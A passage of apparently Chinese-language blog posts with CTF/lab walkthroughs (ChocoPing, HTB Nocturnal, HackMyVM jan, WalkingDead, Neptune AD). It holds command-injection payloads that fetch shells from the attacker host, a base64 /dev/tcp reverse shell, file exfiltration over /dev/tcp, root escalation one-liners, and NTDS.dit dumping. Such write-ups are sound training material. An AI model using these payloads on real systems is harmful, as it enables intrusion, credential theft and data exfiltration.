200 1 L 12 W 126 Ch \u0026#34;\\u\\n\\a\\m\\e \\-\\a\u0026#34; Total time: 0.078702\rProcessed Requests: 174\rFiltered Requests: 171\rRequests/sec.: 2210.858 可以看到其中uname的执行结果\n接下来使用ffuf，得到同样的结果\n[root@kali] /home/kali/Chocoping ❯ ffuf -u \u0026#39;http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\u0026#39; -w ../Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt -enc \u0026#39;FUZZ:urlencode\u0026#39; -fs 21\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 21\r________________________________________________\rc%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 4ms]\r%5Cu%5Cn%5Ca%5Cm%5Ce+%5C-%5Ca [Status: 200, Size: 126, Words: 11, Lines: 2, Duration: 4ms]\rcat+%60echo+-e+%22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%60 [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 3ms]\r:: Progress: [174/174] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:01] :: Errors: 0 :: 两者的区别就在于，wfuzz会自动进行urlencode，而ffuf需要指定编码\n就这里而言，命令的执行方式类似于把所有字符前面加上一个斜杠\n\\u\\n\\a\\m\\e \\-\\a 经过测试，只有第一个单词需要这样做\nhttp://172.17.0.2/ping.php?ip=127.0.0.1;\\c\\u\\r\\l%20172.17.0.1/shell%20-O%20/tmp/shell 我这里使用的是penelope的payload\nhttp://172.17.0.2/ping.php?ip=127.0.0.1;\\p\\r\\i\\n\\t\\f%20%20KGJhc2ggPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0ICAwPiYxKSAm|base64%20-d%20|%20bash 需要注意的是如果URL中存在base64编码的话，要尽量避免加号和一些特殊符号，因为会被转义\n比如这里我就修改了一下他的payload，通过调整其中的空格间距来消除加号和等号\nOwn balutin #\rwww-data@df356a56c13a:/var/www$ sudo -l\rMatching Defaults entries for www-data on df356a56c13a:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser www-data may run the following commands on df356a56c13a:\r(balutin) NOPASSWD: /usr/bin/man man | GTFOBins Root #\r尝试爆破这个压缩包的密码\n[root@kali] /home/kali/Chocoping ❯ zip2john secretito.zip \u0026gt;\u0026gt; zip.hash [root@kali] /home/kali/Chocoping ❯ john zip.hash /usr/share/wordlists/rockyou.txt 得到密码是chocolate\n使用wireshark一下就能看到密码了\n[root@kali] /home/kali/Chocoping ❯ strings traffic.pcap POST /login HTTP/1.1\rHost: ejemplo.com\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 29\rusername=root\u0026amp;password=secretitosecretazo!\rGET /private HTTP/1.1\rAuthorization: Basic cm9vdDpTdXBlclNlY3JldDEyMyE=\rHost: ejemplo.com Summary #\rUser：主要是使用ffuf的时候注意一下url编码\nRoot：zip压缩包爆破\n","date":"2025-04-15","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-chocoping/","section":"Posts","summary":"","title":"Dockerlabs-ChocoPing","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Nocturnal ❯ nmap Nocturnal.htb -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)\r| 256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)\r|_ 256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)\r80/tcp open http nginx 1.18.0 (Ubuntu)\r| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set\r|_http-title: Welcome to Nocturnal\r|_http-server-header: nginx/1.18.0 (Ubuntu) User #\r任意注册一个账户，然后登录，可以上传一些文件\n查看到下载链接是这样的格式\nhttp://nocturnal.htb/view.php?username=aaa\u0026amp;file=2023.xlsx 如果是通过URL里来获取到用户名的话，这里可以进行一下用户的枚举\n[root@kali] /home/kali/Nocturnal ❯ ffuf -u \u0026#39;http://nocturnal.htb/view.php?username=FUZZ\u0026amp;file=2023.xlsx\u0026#39; -w ../Desktop/fuzzDicts/userNameDict/user.txt -H \u0026#39;Cookie: PHPSESSID=k381a2of6lftuk6gnab5f5sapa\u0026#39; -fs 2985\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://nocturnal.htb/view.php?username=FUZZ\u0026amp;file=2023.xlsx\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/userNameDict/user.txt\r:: Header : Cookie: PHPSESSID=k381a2of6lftuk6gnab5f5sapa\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 2985\r________________________________________________\radmin [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 72ms]\ramanda [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 70ms]\rtobias [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 69ms]\r:: Progress: [8886/8886] :: Job [1/1] :: 335 req/sec :: Duration: [0:00:17] :: Errors: 0 :: 可以看到有这几个用户是有特殊回显的，其中查看amanda的文件，发现有一个privacy.odt\n[root@kali] /home/kali/Nocturnal ❯ file privacy.odt ⏎\rprivacy.odt: Zip archive, with extra data prepended 发现是一个压缩包类型的文件，将其解压后查找一下密码\n可以登录到后台，进到admin界面\n滑到最下面，用密码创建备份可以看到，有一个数据库文件\n下载下来进行解压，同样使用amanda的密码，获取到密码hash\n其中tobias的密码是可以破解成功的\nUpdated #\r在更新之后，数据库文件就不存在了，因此尝试审计代码\n在admin.php中，能发现password字段是直接拼接到command里面的\nfunction cleanEntry($entry) {\r$blacklist_chars = [\u0026#39;;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;\u0026amp;\u0026amp;\u0026#39;];\rforeach ($blacklist_chars as $char) {\rif (strpos($entry, $char) !== false) {\rreturn false; // Malicious input detected\r}\r}\rreturn htmlspecialchars($entry, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;);\r}\r\u0026lt;?php\rif (isset($_POST[\u0026#39;backup\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;])) {\r$password = cleanEntry($_POST[\u0026#39;password\u0026#39;]);\r$backupFile = \u0026#34;backups/backup_\u0026#34; . date(\u0026#39;Y-m-d\u0026#39;) . \u0026#34;.zip\u0026#34;;\rif ($password === false) {\recho \u0026#34;\u0026lt;div class=\u0026#39;error-message\u0026#39;\u0026gt;Error: Try another password.\u0026lt;/div\u0026gt;\u0026#34;;\r} else {\r$logFile = \u0026#39;/tmp/backup_\u0026#39; . uniqid() . \u0026#39;.log\u0026#39;;\r$command = \u0026#34;zip -x \u0026#39;./backups/*\u0026#39; -r -P \u0026#34; . $password . \u0026#34; \u0026#34; . $backupFile . \u0026#34; . \u0026gt; \u0026#34; . $logFile . \u0026#34; 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;;\r$descriptor_spec = [\r0 =\u0026gt; [\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;], // stdin\r1 =\u0026gt; [\u0026#34;file\u0026#34;, $logFile, \u0026#34;w\u0026#34;], // stdout\r2 =\u0026gt; [\u0026#34;file\u0026#34;, $logFile, \u0026#34;w\u0026#34;], // stderr\r];\r$process = proc_open($command, $descriptor_spec, $pipes);\rif (is_resource($process)) {\rproc_close($process);\r}\rsleep(2);\r$logContents = file_get_contents($logFile);\rif (strpos($logContents, \u0026#39;zip error\u0026#39;) === false) {\recho \u0026#34;\u0026lt;div class=\u0026#39;backup-success\u0026#39;\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;p\u0026gt;Backup created successfully.\u0026lt;/p\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;a href=\u0026#39;\u0026#34;a . htmlspecialchars($backupFile) . \u0026#34;\u0026#39; class=\u0026#39;download-button\u0026#39; download\u0026gt;Download Backup\u0026lt;/a\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;h3\u0026gt;Output:\u0026lt;/h3\u0026gt;\u0026lt;pre\u0026gt;\u0026#34; . htmlspecialchars($logContents) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\recho \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;;\r} else {\recho \u0026#34;\u0026lt;div class=\u0026#39;error-message\u0026#39;\u0026gt;Error creating the backup.\u0026lt;/div\u0026gt;\u0026#34;;\r}\runlink($logFile);\r}\r}\r?\u0026gt; 使用**%0a换行，用%09**代替空格，即可命令执行\npassword=%0Abash%09-c%09\u0026#34;id\u0026#34;%0A\u0026amp;backup= 下载shell文件\npassword=%0Abash%09-c%09\u0026#34;wget%0910.xx.xx.xx/shell\u0026#34;%0A\u0026amp;backup=\rpassword=%0Abash%09-c%09\u0026#34;bash%09shell\u0026#34;%0A\u0026amp;backup= www-data@nocturnal:~/nocturnal_database$ cat nocturnal_database.db \u0026gt; /dev/tcp/10.xx.xx.xx/8888\r[root@kali] /home/kali/Nocturnal ❯ nc -lvnp 8888 \u0026gt; nocturnal_database.db 同样拿到数据库文件\nRoot #\r发现有内网8080端口\n[root@kali] /home/kali/Nocturnal ❯ ssh tobias@nocturnal.htb -L 9090:127.0.0.1:8080 发现是一个ispconfig服务\n猜测版本可能是3.2\n尝试搜索一下，似乎存在这个CVE-2023-46818的漏洞\n💀 Exploit for Code Injection in Ispconfig CVE-2023-46818\nbipbopbup/CVE-2023-46818-python-exploit: CVE-2023-46818 IPSConfig Python exploit\n同样尝试密码复用的问题，可以看到成功得到Root\nSummary #\rUser：URL传参导致的用户名枚举问题，查到amanda的密码。登录到后台进行备份拿到数据库文件，解密得到tobias的用户密码。\nRoot：内网端口8080运行着ispconfig服务，根据版本查找exp，提权到root。\n","date":"2025-04-14","externalUrl":null,"permalink":"/posts/2025/04/htb-nocturnal/","section":"Posts","summary":"","title":"HTB-Nocturnal","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.144 -p-\rPORT STATE SERVICE\r22/tcp open ssh\r8080/tcp open http-proxy Gobuster #\r[root@kali] /home/kali ❯ gobuster dir -u http://192.168.56.144:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt --exclude-length 45\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.144:8080/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] Exclude Length: 45\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/redirect (Status: 400) [Size: 24]\r/robots.txt (Status: 200) [Size: 16]\rProgress: 97322 / 882244 (11.03%)^C\r[!] Keyboard interrupt detected, terminating.\rProgress: 100724 / 882244 (11.42%)\r===============================================================\rFinished\r=============================================================== 发现一个**/redirect路由，并且需要url**参数\nhttp://192.168.56.144:8080/robots.txt\r/redirect\r/credz 尝试进行将url参数赋值为**/credz**\n这里应该是存在一个参数覆盖的问题\nhttp://192.168.56.144:8080/redirect?url=/credz\u0026amp;url=/credz\r#得到凭证\rssh/EazyLOL Root #\rjan:/opt$ sudo -l\rMatching Defaults entries for ssh on jan:\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rRunas and Command-specific defaults for ssh:\rDefaults!/usr/sbin/visudo env_keep+=\u0026#34;SUDO_EDITOR EDITOR VISUAL\u0026#34;\rUser ssh may run the following commands on jan:\r(root) NOPASSWD: /sbin/service sshd restart 发现配置文件是可以写入的\n修改**/etc/ssh/sshd_config的banner**\n然后重启服务，尝试ssh登录root，可以读取\n要获取到Rootshell的话，需要修改下面几个地方\n其中key是从kali中的公钥中获取到的\nSummary #\rUser：通过变量覆盖解析获取到ssh登录凭证。\nRoot：修改ssh配置文件中的默认密钥位置，获取到root\n","date":"2025-04-09","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-jan/","section":"Posts","summary":"","title":"HackMyVM-jan","type":"posts"},{"content":"《The Walking Dead》又叫做《行尸走肉》，是一部更了十多年的美剧，我是全部看完了的，刚好有这个靶机，那么肯定得打一下。\nBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)\r| 256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)\r|_ 256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-title: The Walking Dead - CTF 访问网页，发现有一个隐藏的shell.php\n[root@kali] /home/kali ❯ curl 172.17.0.2 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;es\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;The Walking Dead - CTF\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { background-color: black; color: red; font-family: \u0026#39;Courier New\u0026#39;, monospace; text-align: center; margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; } h1 { font-size: 50px; text-shadow: 3px 3px 10px darkred; } p { font-size: 20px; } .blood-drip { font-size: 25px; text-shadow: 3px 3px 10px darkred; animation: blink 1s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.5; } } audio { margin-top: 20px; } .hidden-link { display: none; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;The Walking Dead - CTF\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;blood-drip\u0026#34;\u0026gt;Survive... if you can.\u0026lt;/p\u0026gt; \u0026lt;audio autoplay loop\u0026gt; \u0026lt;source src=\u0026#34;walking_dead_theme.mp3\u0026#34; type=\u0026#34;audio/mpeg\u0026#34;\u0026gt; Tu navegador no soporta el audio. \u0026lt;/audio\u0026gt; \u0026lt;p class=\u0026#34;hidden-link\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;hidden/.shell.php\u0026#34;\u0026gt;Access Panel\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Param Fuzz #\r尝试对参数进行爆破\n[root@kali] /home/kali ❯ ffuf -u \u0026#39;http://172.17.0.2/hidden/.shell.php?FUZZ=id\u0026#39; -w ./Desktop/fuzzDicts/paramDict/AllParam.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://172.17.0.2/hidden/.shell.php?FUZZ=id\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\rcmd [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 3ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 18181 req/sec :: Duration: [0:00:04] :: Errors: 0 :: 这里刚好试用一下群友推荐的工具\nbrightio/penelope: Penelope Shell Handler Linpeas #\r可以直接提权\n/usr/bin/python3.8 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;bash\u0026#34;)\u0026#39; Summary #\r似乎是有点太过简单了\n","date":"2025-04-08","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-walkingdead/","section":"Posts","summary":"","title":"Dockerlabs-WalkingDead","type":"posts"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/tags/thehackerslabs/","section":"Tags","summary":"","title":"Thehackerslabs","type":"tags"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/categories/thehackerslabs/","section":"Categories","summary":"","title":"Thehackerslabs","type":"categories"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.10 -sV -A -p-\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r80/tcp open http Microsoft IIS httpd 10.0\r| http-methods: |_ Potentially risky methods: TRACE\r|_http-server-header: Microsoft-IIS/10.0\r|_http-title: Neptune 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-08 07:26:35Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-server-header: Microsoft-HTTPAPI/2.0\r|_http-title: Not Found\r9389/tcp open mc-nmf .NET Message Framing\r49664/tcp open msrpc Microsoft Windows RPC\r49670/tcp open msrpc Microsoft Windows RPC\r53459/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r53460/tcp open msrpc Microsoft Windows RPC\r53470/tcp open msrpc Microsoft Windows RPC\r53479/tcp open msrpc Microsoft Windows RPC\rMAC Address: 08:00:27:37:4E:C0 (Oracle VirtualBox virtual NIC)\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rDevice type: general purpose\rRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\rOS CPE: cpe:/o:microsoft:windows_server_2016\rAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 1 hop\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-time: | date: 2025-04-08T07:27:27\r|_ start_date: N/A\r|_nbstat: NetBIOS name: DC01, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:37:4e:c0 (Oracle VirtualBox virtual NIC)\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required 修改**/etc/hosts**\n127.0.0.1 localhost\r127.0.1.1 kali\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r192.168.56.10 neptune.thl dc01.neptune.thl User Enum #\r这里存在一个PDF的访问链接，并且是以时间作为文件名格式，因此可以写一个脚本进行遍历\nimport os\rimport requests\rfrom datetime import datetime, timedelta\rbase_url = \u0026#34;http://neptune.thl/docs/{date}.pdf\u0026#34;\rstart_date = datetime(2023, 1, 1)\rend_date = datetime(2025, 12, 31)\rsave_dir = \u0026#34;downloads\u0026#34;\ros.makedirs(save_dir, exist_ok=True)\rcurrent = start_date\rwhile current \u0026lt;= end_date:\rdate_str = current.strftime(\u0026#34;%Y-%m-%d\u0026#34;)\rurl = base_url.format(date=date_str)\rfilename = os.path.join(save_dir, f\u0026#34;{date_str}.pdf\u0026#34;)\rtry:\rresponse = requests.get(url, timeout=10)\rif response.status_code == 200:\rwith open(filename, \u0026#34;wb\u0026#34;) as f:\rf.write(response.content)\rprint(f\u0026#34;Downloaded: {date_str}\u0026#34;)\relse:\rprint(f\u0026#34;Not found: {date_str}\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;Error on {date_str}: {e}\u0026#34;)\rcurrent += timedelta(days=1) 再用exiftool提取用户名\nexiftool -Creator -s3 *.pdf | grep -v \u0026#39;^========\u0026#39; |sort | uniq \u0026gt; names.txt 用kerbrute进行用户枚举\n[root@kali] /home/kali/BlackGOld ❯ kerbrute userenum -d neptune.thl ./names.txt --dc 192.168.56.10 __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 04/08/25 - Ronnie Flathers @ropnop\r2025/04/08 15:56:26 \u0026gt; Using KDC(s):\r2025/04/08 15:56:26 \u0026gt; 192.168.56.10:88\r2025/04/08 15:56:26 \u0026gt; [+] VALID USERNAME: Lucas.Miller@neptune.thl\r2025/04/08 15:56:26 \u0026gt; Done! Tested 87 usernames (1 valid) in 0.022 seconds 这里爆破密码失败，尝试在pdf中寻找密码\n[root@kali] /home/kali/BlackGOld/downloads ❯ pdfgrep -i \u0026#39;Lucas\u0026#39; ./* ⏎\r./2023-01-12.pdf:Estimado Lucas Miller,\r./2023-01-12.pdf: ● Nombre de usuario (Usuario AD): lucas.miller@neptune.thl 得到密码是：E@6q%TnR7UEQSXywr8^@\nBloodhound #\r[root@kali] /home/kali/BlackGOld ❯ bloodhound-python -u \u0026#39;Lucas.Miller\u0026#39; -p \u0026#39;E@6q%TnR7UEQSXywr8^@\u0026#39; -d neptune.thl -ns 192.168.56.10 -c all --zip INFO: Found AD domain: neptune.thl\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.neptune.thl\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.neptune.thl\rINFO: Found 8 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.neptune.thl\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250408160411_bloodhound.zip 找到一些其他用户\nOwn Victor #\r通过RPC查询到Victor的密码\n更新一下bloodhound\n[root@kali] /home/kali ❯ bloodhound-python -u \u0026#39;VICTOR.RODRIGUEZ\u0026#39; -p \u0026#39;H5gVCzzZkzJ#wGsT8u1$\u0026#39; -d neptune.thl -ns 192.168.56.10 -c all --zip\rINFO: Found AD domain: neptune.thl\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.neptune.thl\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.neptune.thl\rINFO: Found 8 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.neptune.thl\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250408161249_bloodhound.zip Own Emma #\r注意到Victor是IT组的\n连接到smb，获取到了一个脚本\n$sourceDirectory = \u0026#34;C:\\Confidenciales\u0026#34;\r$destinationDirectory = \u0026#34;E:\\Backups\\Confidenciales\u0026#34;\r$username = \u0026#34;emma.johnson\u0026#34;\r$password = ConvertTo-SecureString \u0026#34;sb9TVndq8N@tUVMmP2@#\u0026#34; -AsPlainText -Force\r$credentials = New-Object System.Management.Automation.PSCredential($username, $password)\r$emailFrom = \u0026#34;emma.johnson@neptune.thl\u0026#34;\r$emailTo = \u0026#34;emma.johnson@neptune.thl\u0026#34;\r$smtpServer = \u0026#34;smtp.neptune.thl\u0026#34;\r$smtpPort = 587\r$emailSubject = \u0026#34;Notificación de Backup Completo\u0026#34;\r$dateStamp = Get-Date -Format \u0026#34;yyyyMMdd_HHmmss\u0026#34;\r$backupFileName = \u0026#34;report_backup_$dateStamp.zip\u0026#34;\r$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName\rfunction Send-EmailNotification {\rparam (\r[string]$subject,\r[string]$body\r)\rtry {\r$smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)\r$smtpClient.EnableSsl = $true\r$smtpClient.Credentials = New-Object System.Net.NetworkCredential(\u0026#34;smtp_user\u0026#34;, \u0026#34;smtp_password\u0026#34;)\r$mailMessage = New-Object System.Net.Mail.MailMessage($emailFrom, $emailTo, $subject, $body)\r$smtpClient.Send($mailMessage)\rWrite-Host \u0026#34;Correo enviado a $emailTo\u0026#34;\r}\rcatch {\rWrite-Host \u0026#34;Error al enviar el correo: $_\u0026#34;\r}\r}\rtry {\rWrite-Host \u0026#34;Iniciando el backup...\u0026#34;\rCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath\rWrite-Host \u0026#34;Backup completado exitosamente. Archivo guardado en: $backupFilePath\u0026#34;\r$emailBody = \u0026#34;El proceso de backup se ha completado correctamente.\u0026#34; + \u0026#34;`n\u0026#34; + \u0026#34;Archivo de backup: $backupFilePath\u0026#34;\rSend-EmailNotification -subject $emailSubject -body $emailBody\r}\rcatch {\rWrite-Host \u0026#34;Error al realizar el backup: $_\u0026#34;\r$errorSubject = \u0026#34;Error en el proceso de Backup\u0026#34;\r$errorBody = \u0026#34;Hubo un problema al realizar el backup.\u0026#34; + \u0026#34;`n\u0026#34; + \u0026#34;Error: $_\u0026#34;\rSend-EmailNotification -subject $errorSubject -body $errorBody\r}# 得到了emma.johnson的密码，可以直接登录\n这里需要重新导入一下靶机，才能看到利用权限\nOwn Thomas #\r改一下他的密码\n[root@kali] /home/kali/BlackGOld ❯ bloodyAD --host \u0026#34;192.168.56.10\u0026#34; -d \u0026#34;neptune.thl\u0026#34; -u \u0026#39;emma.johnson\u0026#39; -p \u0026#39;sb9TVndq8N@tUVMmP2@#\u0026#39; set password \u0026#39;THOMAS.BROWN\u0026#39; \u0026#39;Hello123!\u0026#39; ⏎\r[+] Password changed successfully! 查看一下权限，经典的SeBackupPrivilege\nDiskshadow #\r下面的方法同HTB-Blackfield - HYH\necho \u0026#34;set context persistent nowriters\u0026#34; | out-file ./diskshadow.txt -encoding ascii\recho \u0026#34;add volume c: alias temp\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\recho \u0026#34;create\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append echo \u0026#34;expose %temp% z:\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\rdiskshadow.exe /s c:\\temp\\diskshadow.txt 然后备份ntds，下载\nrobocopy /b Z:\\Windows\\NTDS C:\\temp NTDS.dit\rdownload C:\\temp\\NTDS.dit 解密得到hash\n[root@kali] /home/kali/\r❯ impacket-secretsdump -system system.bak -ntds ntds.dit LOCAL 最后成功提权\nSummary #\rUser：pdf遍历泄露密码，rpc用户信息泄露，最后通过smb拿到emma用户。\nRoot：经典的backup operator组提权。\n下面补充一个知识点\nSAM 文件只包含本地账户的 Hash，适用于非域控（比如普通 Windows 机器）。\nNTDS.dit 是域控数据库，包含 所有域用户 的密码 Hash（更关键、更有用）。\nSYSTEM 文件包含加密密钥，无它无法解密 